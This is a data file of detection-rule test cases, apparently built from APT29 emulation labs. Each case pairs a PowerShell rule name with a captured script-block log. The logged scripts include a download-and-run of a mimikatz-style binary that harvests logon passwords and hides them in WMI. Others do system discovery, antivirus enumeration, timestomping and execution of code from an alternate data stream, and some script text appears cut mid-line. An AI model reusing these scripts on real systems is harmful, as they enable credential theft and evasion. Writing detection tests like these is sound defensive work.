{"source": "powershell.ini:86", "name": "Powershell executed a creation or update of a WMI instance with encoded values", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile(\\\\\\\"http://192.168.0.4:8080/m\\\\\\\",\\\\\\\"m.exe\\\\\\\"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = \\\\\\\"m.exe\\\\\\\"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @(\\\\\\\"privilege::debug\\\\\\\",\\\\\\\"sekurlsa::logonpasswords\\\\\\\",\\\\\\\"exit\\\\\\\"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = \\\\\\\"\\\\\\\"; ForEach ($line in $($output -split \\\\\\\"`r`n\\\\\\\")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}\", \"scriptBlockId\": \"2cc825ce-9e2d-43bd-be95-47590ffc7388\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\n$wc = New-Object System.Net.WebClient; $wc.DownloadFile(\\\"http://192.168.0.4:8080/m\\\",\\\"m.exe\\\"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = \\\"m.exe\\\"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @(\\\"privilege::debug\\\",\\\"sekurlsa::logonpasswords\\\",\\\"exit\\\"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = \\\"\\\"; ForEach ($line in $($output -split \\\"`r`n\\\")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); $EncPws =[Convert]::ToBase64String($PwBytes); Set-WmiInstance -Path \\\\\\\\.\\\\root\\\\cimv2:Win32_AuditCode -Argument @{Result=$EncPws}\\r\\n\\r\\nScriptBlock ID: 2cc825ce-9e2d-43bd-be95-47590ffc7388\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-02T00:09:22.3066723Z\", \"eventRecordID\": \"2633308\", \"threadID\": \"3740\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"5740\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:92", "name": "Powershell executed \"GetComputerNameEx\"", "log": "{ \"win\": { \"eventdata\": { \"path\": \"C:\\\\\\\\Users\\\\\\\\itadmin\\\\\\\\Desktop\\\\\\\\stepThirteen.ps1\", \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"function comp { $Signature=@\\\\\\\" [DllImport(\\\\\\\"kernel32.dll\\\\\\\", SetLastError=true, CharSet=CharSet.Auto)] static extern bool GetComputerNameEx(COMPUTER_NAME_FORMAT NameType,string lpBuffer, ref uint lpnSize);\\\\t enum COMPUTER_NAME_FORMAT {ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysicalDnsFullyQualified} public static string GCN() { bool success; string name = \\\\\\\"                    \\\\\\\"; uint size = 20; success = GetComputerNameEx(COMPUTER_NAME_FORMAT.ComputerNameNetBIOS, name, ref size); return \\\\\\\"NetBIOSName:\\\\\\\\t\\\\\\\" + name.ToString(); } \\\\\\\"@ Add-Type -MemberDefinition $Signature -Name GetCompNameEx -Namespace Kernel32 $result = [Kernel32.GetCompNameEx]::GCN() return $result }\", \"scriptBlockId\": \"9d419422-dfa8-429f-b044-ac6520efe6cc\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction comp {\\n$Signature=@\\\"\\n[DllImport(\\\"kernel32.dll\\\", SetLastError=true, CharSet=CharSet.Auto)]\\nstatic extern bool GetComputerNameEx(COMPUTER_NAME_FORMAT NameType,string lpBuffer, ref uint lpnSize);\\t\\nenum COMPUTER_NAME_FORMAT\\n{ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysicalDnsFullyQualified}\\npublic static string GCN() {\\nbool success;\\nstring name = \\\"                    \\\";\\nuint size = 20;\\nsuccess = GetComputerNameEx(COMPUTER_NAME_FORMAT.ComputerNameNetBIOS, name, ref size);\\nreturn \\\"NetBIOSName:\\\\t\\\" + name.ToString();\\n}\\n\\\"@\\nAdd-Type -MemberDefinition $Signature -Name GetCompNameEx -Namespace Kernel32\\n$result = [Kernel32.GetCompNameEx]::GCN()\\nreturn $result\\n}\\r\\n\\r\\nScriptBlock ID: 9d419422-dfa8-429f-b044-ac6520efe6cc\\r\\nPath: C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1\\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-29T15:32:41.0826634Z\", \"eventRecordID\": \"2630797\", \"threadID\": \"4724\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"96\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:98", "name": "Powershell executed \"NetWkstaGetInfo\"", "log": "{ \"win\": { \"eventdata\": { \"path\": \"C:\\\\\\\\Users\\\\\\\\itadmin\\\\\\\\Desktop\\\\\\\\stepThirteen.ps1\", \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"function domain { $Signature=@\\\\\\\" [DllImport(\\\\\\\"netapi32.dll\\\\\\\", SetLastError=true)] public static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr); [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct WKSTA_INFO_100 { public int platform_id; public string computer_name; public string lan_group; public int ver_major; public int ver_minor; } public static string NWGI()  { string host = null; IntPtr buffer; var ret = NetWkstaGetInfo(host, 100, out buffer); var strut_size = Marshal.SizeOf(typeof (WKSTA_INFO_100)); WKSTA_INFO_100 wksta_info; wksta_info = (WKSTA_INFO_100) Marshal.PtrToStructure(buffer, typeof (WKSTA_INFO_100)); string domainName = wksta_info.lan_group; return \\\\\\\"DomainName:\\\\\\\\t\\\\\\\" + domainName.ToString(); } \\\\\\\"@ Add-Type -MemberDefinition $Signature -Name NetWGetInfo -Namespace NetAPI32 $result = [NetAPI32.NetWGetInfo]::NWGI() return $result }\", \"scriptBlockId\": \"96bb1fb5-897d-4729-b43d-3e2638f3c32e\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction domain {\\n$Signature=@\\\"\\n[DllImport(\\\"netapi32.dll\\\", SetLastError=true)]\\npublic static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr);\\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\\npublic struct WKSTA_INFO_100 {\\npublic int platform_id;\\npublic string computer_name;\\npublic string lan_group;\\npublic int ver_major;\\npublic int ver_minor;\\n}\\npublic static string NWGI() \\n{\\nstring host = null;\\nIntPtr buffer;\\nvar ret = NetWkstaGetInfo(host, 100, out buffer);\\nvar strut_size = Marshal.SizeOf(typeof (WKSTA_INFO_100));\\nWKSTA_INFO_100 wksta_info;\\nwksta_info = (WKSTA_INFO_100) Marshal.PtrToStructure(buffer, typeof (WKSTA_INFO_100));\\nstring domainName = wksta_info.lan_group;\\nreturn \\\"DomainName:\\\\t\\\" + domainName.ToString();\\n}\\n\\\"@\\nAdd-Type -MemberDefinition $Signature -Name NetWGetInfo -Namespace NetAPI32\\n$result = [NetAPI32.NetWGetInfo]::NWGI()\\nreturn $result\\n}\\r\\n\\r\\nScriptBlock ID: 96bb1fb5-897d-4729-b43d-3e2638f3c32e\\r\\nPath: C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1\\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-29T15:32:47.8484312Z\", \"eventRecordID\": \"2630829\", \"threadID\": \"4724\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"96\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:104", "name": "Powershell executed \"GetUserNameEx\"", "log": "{ \"win\": { \"eventdata\": { \"path\": \"C:\\\\\\\\Users\\\\\\\\itadmin\\\\\\\\Desktop\\\\\\\\stepThirteen.ps1\", \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"function user { $Signature=@\\\\\\\" [DllImport(\\\\\\\"secur32.dll\\\\\\\", CharSet=CharSet.Auto, SetLastError=true)] public static extern int GetUserNameEx (int nameFormat, string userName, ref int userNameSize); public static string GUN() { string uname = \\\\\\\"                                        \\\\\\\"; int size = 40; int EXTENDED_NAME_FORMAT_NAME_DISPLAY = 2; string ret = \\\\\\\"\\\\\\\"; if(0 != GetUserNameEx(EXTENDED_NAME_FORMAT_NAME_DISPLAY, uname, ref size)) { ret += \\\\\\\"UserName:\\\\\\\\t\\\\\\\" + uname.ToString(); }   return ret; } \\\\\\\"@ Add-Type -MemberDefinition $Signature -Name GetUNameEx -Namespace Secur32 $result = [Secur32.GetUNameEx]::GUN() return $result }\", \"scriptBlockId\": \"ecd94e73-ad13-4309-b256-6ebd527f7a0f\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction user {\\n$Signature=@\\\"\\n[DllImport(\\\"secur32.dll\\\", CharSet=CharSet.Auto, SetLastError=true)]\\npublic static extern int GetUserNameEx (int nameFormat, string userName, ref int userNameSize);\\npublic static string GUN() {\\nstring uname = \\\"                                        \\\";\\nint size = 40;\\nint EXTENDED_NAME_FORMAT_NAME_DISPLAY = 2;\\nstring ret = \\\"\\\";\\nif(0 != GetUserNameEx(EXTENDED_NAME_FORMAT_NAME_DISPLAY, uname, ref size))\\n{\\nret += \\\"UserName:\\\\t\\\" + uname.ToString();\\n}  \\nreturn ret;\\n}\\n\\\"@\\nAdd-Type -MemberDefinition $Signature -Name GetUNameEx -Namespace Secur32\\n$result = [Secur32.GetUNameEx]::GUN()\\nreturn $result\\n}\\r\\n\\r\\nScriptBlock ID: ecd94e73-ad13-4309-b256-6ebd527f7a0f\\r\\nPath: C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1\\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-29T15:32:45.0360677Z\", \"eventRecordID\": \"2630813\", \"threadID\": \"4724\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"96\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:110", "name": "Powershell executed \"CreateToolhelp32Snapshot\"", "log": "{ \"win\": { \"eventdata\": { \"path\": \"C:\\\\\\\\Users\\\\\\\\itadmin\\\\\\\\Desktop\\\\\\\\stepThirteen.ps1\", \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"function pslist { $Signature=@\\\\\\\" [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] private struct PROCESSENTRY32 { const int MAX_PATH = 260; internal UInt32 dwSize; internal UInt32 cntUsage; internal UInt32 th32ProcessID; internal IntPtr th32DefaultHeapID; internal UInt32 th32ModuleID; internal UInt32 cntThreads; internal UInt32 th32ParentProcessID; internal Int32 pcPriClassBase; internal UInt32 dwFlags; [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)] internal string szExeFile; } [DllImport(\\\\\\\"kernel32\\\\\\\", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)] static extern IntPtr CreateToolhelp32Snapshot([In]UInt32  -MemberDefinition $Signature -Name CT32Snapshot  -Namespace Kernel32 $result = [Kernel32.CT32Snapshot]::CT32S() return $result }\", \"scriptBlockId\": \"03eb3886-b470-428f-8d1d-444c5ae2e453\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction pslist {\\n$Signature=@\\\"\\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]\\nprivate struct PROCESSENTRY32\\n{\\nconst int MAX_PATH = 260;\\ninternal UInt32 dwSize;\\ninternal UInt32 cntUsage;\\ninternal UInt32 th32ProcessID;\\ninternal IntPtr th32DefaultHeapID;\\ninternal UInt32 th32ModuleID;\\ninternal UInt32 cntThreads;\\ninternal UInt32 th32ParentProcessID;\\ninternal Int32 pcPriClassBase;\\ninternal UInt32 dwFlags;\\n[MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]\\ninternal string szExeFile;\\n}\\n[DllImport(\\\"kernel32\\\", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]\\nstatic extern IntPtr CreateToolhelp32Snapshot([In]UInt32 03eb3886-b470-428f-8d1d-444c5ae2e453\\r\\nPath: C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepThirteen.ps1\\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-29T15:32:51.8185745Z\", \"eventRecordID\": \"2630845\", \"threadID\": \"4724\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"96\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:116", "name": "Timestomp", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"# This code was derived from https://github.com/matthewdunwoody/POSHSPY  function timestomp {  [CmdletBinding()] param (   [string] $dest  )  $source =  + '\\\\\\\\system32') | ? { !$_.PSIsContainer } | Where-Object { $_.LastWriteTime -lt \\\\\\\"01/01/2013\\\\\\\" } | Get-Random | %{ $_.FullName })  [IO.File]::SetCreationTime($dest, [IO.File]::GetCreationTime($source))  [IO.File]::SetLastAccessTime($dest, [IO.File]::GetLastAccessTime($source))  [IO.File]::SetLastWriteTime($dest, [IO.File]::GetLastWriteTime($source)) }\",\"scriptBlockId\":\"e7e5e6f4-5b1c-4294-82fb-137c9dbc9a0c\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n# This code was derived from https://github.com/matthewdunwoody/POSHSPY\\n\\nfunction timestomp {\\n\\t[CmdletBinding()] param (\\n\\t\\t[string] $dest\\n\\t)\\n\\t$source =  + '\\\\system32') | ? { !$_.PSIsContainer } | Where-Object { $_.LastWriteTime -lt \\\"01/01/2013\\\" } | Get-Random | %{ $_.FullName })\\n\\t[IO.File]::SetCreationTime($dest, [IO.File]::GetCreationTime($source))\\n\\t[IO.File]::SetLastAccessTime($dest, [IO.File]::GetLastAccessTime($source))\\n\\t[IO.File]::SetLastWriteTime($dest, [IO.File]::GetLastWriteTime($source))\\n}\\n\\r\\n\\r\\nScriptBlock ID: e7e5e6f4-5b1c-4294-82fb-137c9dbc9a0c\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-11-01T19:38:31.9490151Z\",\"eventRecordID\":\"97256\",\"threadID\":\"6276\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"5300\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:122", "name": "Powershell tampering with WMI AntiVirusProduct class", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"function detectav {  $AntiVirusProducts = Get-WmiObject -Namespace \\\\\\\"root\\\\\\\\SecurityCenter2\\\\\\\" -Class AntiVirusProduct      $ret = @()     foreach($AntiVirusProduct in $AntiVirusProducts){          #Create hash-table for each computer         $ht = @{}         $ht.Name = $AntiVirusProduct.displayName         $ht.'Product GUID' = $AntiVirusProduct.instanceGuid         $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe         $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe   $ht.'Timestamp' = $AntiVirusProduct.timestamp           #Create a new object for each computer         $ret += New-Object -TypeName PSObject -Property $ht      }     Return $ret }\",\"scriptBlockId\":\"82a30873-d6cb-4690-bba9-1b3158b88081\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction detectav {\\n\\t$AntiVirusProducts = Get-WmiObject -Namespace \\\"root\\\\SecurityCenter2\\\" -Class AntiVirusProduct\\n\\n    $ret = @()\\n    foreach($AntiVirusProduct in $AntiVirusProducts){\\n\\n        #Create hash-table for each computer\\n        $ht = @{}\\n        $ht.Name = $AntiVirusProduct.displayName\\n        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid\\n        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe\\n        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe\\n\\t\\t$ht.'Timestamp' = $AntiVirusProduct.timestamp\\n\\n\\n        #Create a new object for each computer\\n        $ret += New-Object -TypeName PSObject -Property $ht \\n    }\\n    Return $ret\\n}\\r\\n\\r\\nScriptBlock ID: 82a30873-d6cb-4690-bba9-1b3158b88081\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-11-01T19:52:17.4666547Z\",\"eventRecordID\":\"97263\",\"threadID\":\"6276\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"5300\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:128", "name": "Powershell tampering software installation info on system registry", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"function software {   $keys = \\\\\\\"SOFTWARE\\\\\\\\Wow6432Node\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Uninstall\\\\\\\",                    \\\\\\\"SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Uninstall\\\\\\\"  $type = [Microsoft.Win32.RegistryHive]::LocalMachine  $regKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($type, $comp)  $ret = \\\\\\\"\\\\\\\"  foreach ($key in $keys) {   $a = $regKey.OpenSubKey($key)   $subkeyNames = $a.GetSubKeyNames()   foreach($subkeyName in $subkeyNames) {                     $productKey = $a.OpenSubKey($subkeyName)                     $productName = $productKey.GetValue(\\\\\\\"DisplayName\\\\\\\")                     $productVersion = $productKey.GetValue(\\\\\\\"DisplayVersion\\\\\\\")                     $productComments = $productKey.GetValue(\\\\\\\"Comments\\\\\\\")      $out = $productName + \\\\\\\" | \\\\\\\" + $productVersion + \\\\\\\" | \\\\\\\" + $productComments + \\\\\\\"`n\\\\\\\"      $ret += $out   }  }  Return $ret }\",\"scriptBlockId\":\"2176a6be-c680-46ef-a6d8-5fa7ec788944\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction software {\\n\\t$keys = \\\"SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\",\\n                   \\\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\"\\n\\t$type = [Microsoft.Win32.RegistryHive]::LocalMachine\\n\\t$regKey = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($type, $comp)\\n\\t$ret = \\\"\\\"\\n\\tforeach ($key in $keys) {\\n\\t\\t$a = $regKey.OpenSubKey($key)\\n\\t\\t$subkeyNames = $a.GetSubKeyNames()\\n\\t\\tforeach($subkeyName in $subkeyNames) {\\n                    $productKey = $a.OpenSubKey($subkeyName)\\n                    $productName = $productKey.GetValue(\\\"DisplayName\\\")\\n                    $productVersion = $productKey.GetValue(\\\"DisplayVersion\\\")\\n                    $productComments = $productKey.GetValue(\\\"Comments\\\")\\n\\t\\t\\t\\t\\t$out = $productName + \\\" | \\\" + $productVersion + \\\" | \\\" + $productComments + \\\"`n\\\"\\n\\t\\t\\t\\t\\t$ret += $out\\n\\t\\t}\\n\\t}\\n\\tReturn $ret\\n}\\r\\n\\r\\nScriptBlock ID: 2176a6be-c680-46ef-a6d8-5fa7ec788944\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-11-01T20:06:39.9348862Z\",\"eventRecordID\":\"97265\",\"threadID\":\"6276\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"5300\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:134", "name": "Powershell script executed ConvertSidToStringSid API", "log": "{ \"win\": { \"eventdata\": { \"path\": \"C:\\\\\\\\Users\\\\\\\\itadmin\\\\\\\\Desktop\\\\\\\\stepSixteen_SID.ps1\", \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"$PID -DesiredAccess PROCESS_QUERY_LIMITED_INFORMATION  $hToken = OpenProcessToken -ProcessHandle $hProcess -DesiredAccess TOKEN_QUERY  $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, 0, $TokenPtrSize, [ref]$TokenPtrSize)  [IntPtr]$TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)  $Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, $TokenPtr, $TokenPtrSize, [ref]$TokenPtrSize); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()  if($Success) {   $TokenOwner = $TokenPtr -as $TOKEN_OWNER   if($TokenOwner.Owner -ne $null) {    $OwnerSid = ConvertSidToStringSid -SidPointer $TokenOwner.Owner    $Sid = New-Object System.Security.Principal.SecurityIdentifier($OwnerSid)    $OwnerName = $Sid.Translate([System.Security.Principal.NTAccount])    $obj = New-Object -TypeName psobject    $obj | Add-Member -MemberType NoteProperty -Name Sid -Value $OwnerSid    $obj | Add-Member -MemberType NoteProperty -Name Name -Value $OwnerName    Write-Output $obj   }   else {    Write-Output \\\\\\\"Fail\\\\\\\"   }   [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPtr)  }  else {   Write-Debug \\\\\\\"[GetTokenInformation] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\\\\\\\"  } }\", \"scriptBlockId\": \"c491303a-6988-412c-8618-1d8f1029fe01\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):$PID -DesiredAccess PROCESS_QUERY_LIMITED_INFORMATION\\n\\t$hToken = OpenProcessToken -ProcessHandle $hProcess -DesiredAccess TOKEN_QUERY\\n\\t$Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, 0, $TokenPtrSize, [ref]$TokenPtrSize)\\n\\t[IntPtr]$TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)\\n\\t$Success = $Advapi32::GetTokenInformation($hToken, $TOKEN_INFORMATION_CLASS::$TokenInformationClass, $TokenPtr, $TokenPtrSize, [ref]$TokenPtrSize); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\\n\\tif($Success) {\\n\\t\\t$TokenOwner = $TokenPtr -as $TOKEN_OWNER\\n\\t\\tif($TokenOwner.Owner -ne $null) {\\n\\t\\t\\t$OwnerSid = ConvertSidToStringSid -SidPointer $TokenOwner.Owner\\n\\t\\t\\t$Sid = New-Object System.Security.Principal.SecurityIdentifier($OwnerSid)\\n\\t\\t\\t$OwnerName = $Sid.Translate([System.Security.Principal.NTAccount])\\n\\t\\t\\t$obj = New-Object -TypeName psobject\\n\\t\\t\\t$obj | Add-Member -MemberType NoteProperty -Name Sid -Value $OwnerSid\\n\\t\\t\\t$obj | Add-Member -MemberType NoteProperty -Name Name -Value $OwnerName\\n\\t\\t\\tWrite-Output $obj\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\tWrite-Output \\\"Fail\\\"\\n\\t\\t}\\n\\t\\t[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPtr)\\n\\t}\\n\\telse {\\n\\t\\tWrite-Debug \\\"[GetTokenInformation] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\\\"\\n\\t}\\n}\\r\\n\\r\\nScriptBlock ID: c491303a-6988-412c-8618-1d8f1029fe01\\r\\nPath: C:\\\\Users\\\\itadmin\\\\Desktop\\\\stepSixteen_SID.ps1\\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-03T11:15:23.9056264Z\", \"eventRecordID\": \"2634103\", \"threadID\": \"6156\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"5212\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:140", "name": "Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Get-Content '.\\\\\\\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX\", \"scriptBlockId\": \"84d37fbf-a57c-4e2f-99b9-e79d3c2ed956\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nGet-Content '.\\\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX\\r\\n\\r\\nScriptBlock ID: 84d37fbf-a57c-4e2f-99b9-e79d3c2ed956\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:47:12.4764636Z\", \"eventRecordID\": \"2115353\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
